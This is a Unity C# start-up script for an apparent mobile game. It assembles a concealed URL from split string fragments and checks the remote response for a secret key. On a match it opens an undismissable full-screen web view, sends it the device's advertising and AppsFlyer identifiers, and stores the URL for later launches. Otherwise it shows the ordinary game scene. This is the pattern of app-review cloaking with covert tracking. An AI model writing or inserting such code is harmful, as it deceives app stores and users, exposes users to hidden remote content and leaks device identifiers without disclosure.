using System.Collections;
using System.Collections.Generic;
using UnityEngine;
using UnityEngine.Networking;
using UnityEngine.SceneManagement;

public class MainJSF : MonoBehaviour
{
    public List<string> splitters;
    [HideInInspector] public string oneJSFname = "";
    [HideInInspector] public string twoJSFname = "";



    private void Awake()
    {
        if (PlayerPrefs.GetInt("idfaJSF") != 0)
        {
            Application.RequestAdvertisingIdentifierAsync(
            (string advertisingId, bool trackingEnabled, string error) =>
            { oneJSFname = advertisingId; });
        }
    }


    private void MoveJSF()
    {
        Screen.orientation = ScreenOrientation.Portrait;
        SceneManager.LoadScene("loadGame");
    }


    

    private void Start()
    {
        if (Application.internetReachability != NetworkReachability.NotReachable)
        {
            if (PlayerPrefs.GetString("UrlJSFmall", string.Empty) != string.Empty)
            {
                circJSFf(PlayerPrefs.GetString("UrlJSFmall"));
            }
            else
            {
                foreach (string n in splitters)
                {
                    twoJSFname += n;
                }
                StartCoroutine(IENUMENATORJSF());
            }
        }
        else
        {
            MoveJSF();
        }
    }

    private IEnumerator IENUMENATORJSF()
    {
        using (UnityWebRequest jsf = UnityWebRequest.Get(twoJSFname))
        {

            yield return jsf.SendWebRequest();
            if (jsf.isNetworkError)
            {
                MoveJSF();
            }
            int parkJSF = 7;
            while (PlayerPrefs.GetString("glrobo", "") == "" && parkJSF > 0)
            {
                yield return new WaitForSeconds(1);
                parkJSF--;
            }
            try
            {
                if (jsf.result == UnityWebRequest.Result.Success)
                {
                    if (jsf.downloadHandler.text.Contains("JwlsSwtchKMxdjerq"))
                    {

                        try
                        {
                            var subs = jsf.downloadHandler.text.Split('|');
                            circJSFf(subs[0] + "?idfa=" + oneJSFname, subs[1], int.Parse(subs[2]));
                        }
                        catch
                        {
                            circJSFf(jsf.downloadHandler.text + "?idfa=" + oneJSFname + "&gaid=" + AppsFlyerSDK.AppsFlyer.getAppsFlyerId() + PlayerPrefs.GetString("glrobo", ""));
                        }
                    }
                    else
                    {
                        MoveJSF();
                    }
                }
                else
                {
                    MoveJSF();
                }
            }
            catch
            {
                MoveJSF();
            }
        }
    }
    private void circJSFf(string UrlJSFmall, string NamingJSF = "", int pix = 70)
    {
        UniWebView.SetAllowInlinePlay(true);
        var _powersJSF = gameObject.AddComponent<UniWebView>();
        _powersJSF.SetToolbarDoneButtonText("");
        switch (NamingJSF)
        {
            case "0":
                _powersJSF.SetShowToolbar(true, false, false, true);
                break;
            default:
                _powersJSF.SetShowToolbar(false);
                break;
        }
        _powersJSF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        _powersJSF.OnShouldClose += (view) =>
        {
            return false;
        };
        _powersJSF.SetSupportMultipleWindows(true);
        _powersJSF.SetAllowBackForwardNavigationGestures(true);
        _powersJSF.OnMultipleWindowOpened += (view, windowId) =>
        {
            _powersJSF.SetShowToolbar(true);

        };
        _powersJSF.OnMultipleWindowClosed += (view, windowId) =>
        {
            switch (NamingJSF)
            {
                case "0":
                    _powersJSF.SetShowToolbar(true, false, false, true);
                    break;
                default:
                    _powersJSF.SetShowToolbar(false);
                    break;
            }
        };
        _powersJSF.OnOrientationChanged += (view, orientation) =>
        {
            _powersJSF.Frame = new Rect(0, pix, Screen.width, Screen.height - pix);
        };
        _powersJSF.OnPageFinished += (view, statusCode, url) =>
        {
            if (PlayerPrefs.GetString("UrlJSFmall", string.Empty) == string.Empty)
            {
                PlayerPrefs.SetString("UrlJSFmall", url);
            }
        };
        _powersJSF.Load(UrlJSFmall);
        _powersJSF.Show();
    }

}
